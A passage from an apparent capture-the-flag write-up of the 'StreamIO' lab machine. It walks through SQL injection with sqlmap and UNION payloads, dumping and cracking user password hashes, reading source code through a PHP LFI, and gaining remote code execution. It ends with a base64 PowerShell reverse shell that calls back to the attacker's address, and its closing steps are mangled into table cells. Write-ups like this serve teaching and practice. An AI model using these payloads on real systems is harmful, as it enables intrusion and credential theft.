<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> STREAMIO</span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> streamio_backup</span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> tempdb</span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="co">## EMAIL</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio sqlmap <span class="at">-r</span> req-email.txt <span class="at">--dbs</span> <span class="at">--threads</span> 5 <span class="at">--force-ssl</span></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a><span class="ex">[11:59:45]</span> <span class="pp">[</span><span class="ss">CRITICAL</span><span class="pp">]</span> all tested parameters do not appear to be injectable.]</span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a><span class="co">## SEARCH</span></span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio sqlmap <span class="at">-r</span> req-search.txt <span class="at">--dbs</span> <span class="at">--threads</span> 5 <span class="at">--force-ssl</span></span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:01:57]</span> <span class="pp">[</span><span class="ss">CRITICAL</span><span class="pp">]</span> all tested parameters do not appear to be injectable.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>We have a timed injection in the username parameter of the login page. Continue to enumerate tables of database <code>STREAMIO</code>.</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio sqlmap <span class="at">-r</span> req-login.txt <span class="at">-D</span> STREAMIO <span class="at">--tables</span> <span class="at">--force-ssl</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:11:46]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> retrieved: dbo.movies</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:11:46]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> retrieved: dbo.users</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Database:</span> STREAMIO</span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[2</span> tables]</span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------+</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">movies</span> <span class="kw">|</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">users</span>  <span class="kw">|</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------+</span></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio sqlmap <span class="at">-r</span> req-login.txt <span class="at">-D</span> STREAMIO <span class="at">-T</span> dbo.users <span class="at">--dump</span> <span class="at">--force-ssl</span></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:14:05]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> retrieved: is_staff</span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:14:47]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> retrieved: password</span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[12:15:29]</span> <span class="pp">[</span><span class="ss">INFO</span><span class="pp">]</span> retrieved: username</span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+----------+----------------------------------------------------+----------------------------------------------------+</span></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">is_staff</span> <span class="kw">|</span> <span class="ex">password</span>                                           <span class="kw">|</span> <span class="ex">username</span>                                           <span class="kw">|</span></span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+----------+----------------------------------------------------+----------------------------------------------------+</span></span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">3</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">c660060492d9edcaa8332d89c99c9239</span>                   <span class="kw">|</span> <span class="ex">James</span>                                              <span class="kw">|</span></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">4</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">925e5408ecb67aea449373d668b7359e</span>                   <span class="kw">|</span> <span class="ex">Theodore</span>                                           <span class="kw">|</span></span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">5</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">083ffae904143c4796e464dac33c1f7d</span>                   <span class="kw">|</span> <span class="ex">Samantha</span>                                           <span class="kw">|</span></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">6</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">08344b85b329d7efd611b7a7743e8a09</span>                   <span class="kw">|</span> <span class="ex">Lauren</span>                                             <span class="kw">|</span></span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">7</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">d62be0dc82071bccc1322d64ec5b6c51</span>                   <span class="kw">|</span> <span class="ex">William</span>                                            <span class="kw">|</span></span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">8</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">f87d3c0d6c8fd686aacc6627f1f493a5</span>                   <span class="kw">|</span> <span class="ex">Sabrina</span>                                            <span class="kw">|</span></span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">9</span>  <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">f03b910e2bd0313a23fdd7575f34a694</span>                   <span class="kw">|</span> <span class="ex">Robert</span>                                             <span class="kw">|</span></span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">10</span> <span class="kw">|</span> <span class="ex">1</span>        <span class="kw">|</span> <span class="ex">3577c47eb1e12c8ba021611e1280753c</span>                   <span class="kw">|</span> <span class="ex">Thane</span>                                              <span class="kw">|</span></span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+----------+----------------------------------------------------+----------------------------------------------------+</span></span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a><span class="ex">LAUREN</span> = 08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##</span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a><span class="ex">SABRINA</span> = f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The dump is time-based which takes ages, so after about two hours I stop sqlmap and look for other ways in. Of the 10 hashes collected we’re able to crack two - however they don’t lead to anything.</p>
<p>Shifting focus to <code>watch.streamio.htb/search.php</code> I notice that the user input isn’t parameterized. If I search for <code>1</code> I get all movies containing 1, however if I search for <code>1';-- -</code> I only get all movies <strong>ENDING</strong> with 1, and they are sorted by release date.</p>
<p>With that information I assume the original query is something like this:</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>## ASSUMED ORIGINAL <span class="kw">QUERY</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> Name, ReleaseDate <span class="kw">FROM</span> STREAMIO.movies</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="kw">WHERE</span> Name <span class="op">=</span> <span class="st">'INPUT-DATA'</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="kw">ORDER</span> <span class="kw">BY</span> Name <span class="kw">ASC</span>;</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Playing around with SQLi and <code>UNION SELECT @@version</code> we can ennumerate the number of columns, example:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT @@version</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> @@version,<span class="dv">2</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT 1,@@version</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> @@version,<span class="dv">2</span>,<span class="dv">3</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT 1,@@version,3</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="dv">1</span>,<span class="dv">2</span>,@@version</span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="op">..</span>.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>At 6 columns we get the response we’re looking for:</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>## REQUEST</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>q<span class="op">=</span><span class="dv">1</span><span class="st">' UNION SELECT 1,@@version,3,4,5,6;-- -</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="st">'</span>## RESPONSE</span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>Microsoft SQL Server <span class="dv">2019</span> (RTM) <span class="op">-</span> <span class="dv">15</span>.<span class="dv">0</span>.<span class="fl">2000.5</span> (X64) </span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>    Sep <span class="dv">24</span> <span class="dv">2019</span> <span class="dv">13</span><span class="ch">:48:23</span> </span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>    Copyright (C) <span class="dv">2019</span> Microsoft Corporation</span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>    Express Edition (<span class="dv">64</span><span class="op">-</span>bit) <span class="kw">on</span> Windows Server <span class="dv">2019</span> Standard <span class="fl">10.0</span> <span class="op">&lt;</span>X64<span class="op">&gt;</span> (<span class="kw">Build</span> <span class="dv">17763</span>: ) (Hypervisor)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>With this injection, and previously known database information, we are now able to extract the entire user database.</p>
<pre class="http"><code>### REQUEST
POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

q=1' UNION SELECT 1,concat(username,':',password),3,4,5,6 from dbo.users;-- -</code></pre>
<p>Copy the output to a file, and with some bash magic we can make a list of all users and it’s corresponding hash.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio cat sqli-out.txt<span class="kw">|</span> <span class="fu">awk</span> <span class="at">-F</span> <span class="st">" "</span> <span class="st">'{print $2,$3}'</span> <span class="kw">|</span> <span class="fu">cut</span> <span class="at">-d</span><span class="st">'&gt;'</span> <span class="at">-f2</span> <span class="kw">|</span> <span class="fu">sort</span> <span class="at">-u</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">" :"</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">'s/ //g'</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">admin:665a50ac9eaa781e4f7f04199db97a11</span></span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Alexendra:1c2b3d8270321140e5153f6637d3ee53</span></span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">asdasd:7815696ecbf1c96e6894b779456d330e</span></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Austin:0049ac57646627b8d7aeaccf8b6a936f</span></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Barbra:3961548825e3e21df5646cafe11c6c76</span></span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Barry:54c88b2dbd7b1a84012fabc1a4c73415</span></span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Baxter:22ee218331afd081b0dcd8115284bae3</span></span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8</span></span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Carmon:35394484d89fcfdb3c5e447fe749d213</span></span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Clara:ef8f3d30a856cf166fb8215aca93e9ff</span></span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a><span class="ex">:d41d8cd98f00b204e9800998ecf8427e</span></span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5</span></span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Garfield:8097cedd612cc37c29db152b6e9edbd3</span></span>
<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Gloria:0cfaaaafb559f081df2befbe66686de0</span></span>
<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a><span class="ex">James:c660060492d9edcaa8332d89c99c9239</span></span>
<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Juliette:6dcd87740abb64edfa36d170f0d5450d</span></span>
<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Lauren:08344b85b329d7efd611b7a7743e8a09</span></span>
<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f</span></span>
<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Lucifer:7df45a9e3de3863807c026ba48e55fb3</span></span>
<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a><span class="ex">mat:43b0494e505be040c691856c67385ec6</span></span>
<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a><span class="ex">mat:4a258d930b7d3409982d727ddbb4ba88</span></span>
<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a><span class="ex">mattt:7b8a3544637ef0e8fd2859095876e461</span></span>
<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a><span class="ex">mca:43b0494e505be040c691856c67385ec6</span></span>
<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a><span class="ex">mca:7b8a3544637ef0e8fd2859095876e461</span></span>
<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Michelle:b83439b16f844bd6ffe35c02fe21b3c0</span></span>
<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a><span class="ex">oliver:25ed1bcb423b0b7200f485fc5ff71c8e</span></span>
<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a><span class="ex">Oliver:fd78db29173a5cf701bd69027cb9bf6b</span></span>
<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a><span class="ex">Robert:f03b910e2bd0313a23fdd7575f34a694</span></span>
<span id="cb11-30"><a href="#cb11-30" aria-hidden="true" tabindex="-1"></a><span class="ex">Robin:dc332fb5576e9631c9dae83f194f8e70</span></span>
<span id="cb11-31"><a href="#cb11-31" aria-hidden="true" tabindex="-1"></a><span class="ex">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5</span></span>
<span id="cb11-32"><a href="#cb11-32" aria-hidden="true" tabindex="-1"></a><span class="ex">Samantha:083ffae904143c4796e464dac33c1f7d</span></span>
<span id="cb11-33"><a href="#cb11-33" aria-hidden="true" tabindex="-1"></a><span class="ex">Stan:384463526d288edcc95fc3701e523bc7</span></span>
<span id="cb11-34"><a href="#cb11-34" aria-hidden="true" tabindex="-1"></a><span class="ex">Thane:3577c47eb1e12c8ba021611e1280753c</span></span>
<span id="cb11-35"><a href="#cb11-35" aria-hidden="true" tabindex="-1"></a><span class="ex">Theodore:925e5408ecb67aea449373d668b7359e</span></span>
<span id="cb11-36"><a href="#cb11-36" aria-hidden="true" tabindex="-1"></a><span class="ex">Victor:bf55e15b119860a6e6b5a164377da719</span></span>
<span id="cb11-37"><a href="#cb11-37" aria-hidden="true" tabindex="-1"></a><span class="ex">Victoria:b22abb47a02b52d5dfa27fb0b534f693</span></span>
<span id="cb11-38"><a href="#cb11-38" aria-hidden="true" tabindex="-1"></a><span class="ex">William:d62be0dc82071bccc1322d64ec5b6c51</span></span>
<span id="cb11-39"><a href="#cb11-39" aria-hidden="true" tabindex="-1"></a><span class="ex">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Crack the hashes with hashcat</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio hashcat <span class="at">-a0</span> <span class="at">-m0</span> hashes.txt /usr/share/wordlists/rockyou.txt <span class="at">--user</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio hashcat <span class="at">-a0</span> <span class="at">-m0</span> hashes.txt /usr/share/wordlists/rockyou.txt <span class="at">--user</span> <span class="at">--show</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd</span></span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">asdasd:7815696ecbf1c96e6894b779456d330e:asd</span></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Barry:54c88b2dbd7b1a84012fabc1a4c73415:</span><span class="va">$hadoW</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:</span><span class="va">$monique$1</span><span class="ex">991$</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%</span><span class="va">$clara</span></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">d41d8cd98f00b204e9800998ecf8427e:</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Juliette:6dcd87740abb64edfa36d170f0d5450d:</span><span class="va">$3</span><span class="ex">xybitch</span></span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i</span></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="ex">mat:4a258d930b7d3409982d727ddbb4ba88:mat</span></span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="ex">oliver:25ed1bcb423b0b7200f485fc5ff71c8e:zz</span></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span></span>
<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical</span></span>
<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!</span></span>
<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="ex">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<table class="caption-top table">
<thead>
<tr class="header">
<th style="text-align: left;">### Step 3 Testing all the credentials on <code>https://streamio.htb/login.php</code> we find that only <code>yoshihide:66boysandgirls..</code> works. As <code>yoshihide</code> we are able to visit <code>https://streamio.htb/admin</code> and can manage users, staff, movies and “leave a message for admin”.</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">### Step 4 Tinkering around with the LFI I came to think of <code>php://filter</code>, we should be able to extract the code of the known files to see if there are any vulnerable functions that we can exploit.</td>
</tr>
<tr class="even">
<td style="text-align: left;">```bash ➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php [… snip …] PGgxPk1..</td>
</tr>
<tr class="odd">
<td style="text-align: left;">➜ streamio echo “PGgxPk1..” | base64 -d [… snip …]</td>
</tr>
<tr class="even">
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;"></td>
</tr>
<tr class="even">
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;">At the end we find a vulnerable function:</td>
</tr>
<tr class="even">
<td style="text-align: left;">With the eval-function we are able to execute php scripts and system commands. First confirm that we got RCE and then leverage to gain a reverse shell! ```bash ➜ streamio echo “c3lzdGVtKCRfR0VUWydjbWQnXSk7” | base64 -d system($_GET[‘cmd’]);%</td>
</tr>
<tr class="odd">
<td style="text-align: left;">➜ streamio curl -k –cookie “PHPSESSID=ciku9juef85i9sj1eju4alj375” –data-binary “include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7” https://streamio.htb/admin/?debug=master.php&amp;cmd=dir [… snip …] <br></td>
</tr>
<tr class="even">
<td style="text-align: left;">Directory of C:.htb</td>
</tr>
<tr class="odd">
<td style="text-align: left;">02/22/2022 03:49 AM</td>
</tr>
<tr class="even">
<td style="text-align: left;">For the reverse shell I find it to be easiest to use <a href="https://revshells.com">revshells.com</a> and select <code>PowerShell #3 (Base64)</code> and from the advanced options enable URL Encoding. This will most of the times get rid of all syntax/encoding issues. ```bash ➜ streamio curl -k –cookie “PHPSESSID=tale6gpt5rke8jbtvc6rqlhqng” –data-binary “include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7” https://streamio.htb/admin/?debug=master.php&amp;cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D</td>
</tr>
<tr class="odd">
<td style="text-align: left;">➜ streamio rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.3] from (UNKNOWN) [10.10.11.158] 51338</td>
</tr>
<tr class="even">
<td style="text-align: left;">PS C:.htb&gt; whoami streamio```</td>
</tr>
<tr class="odd">
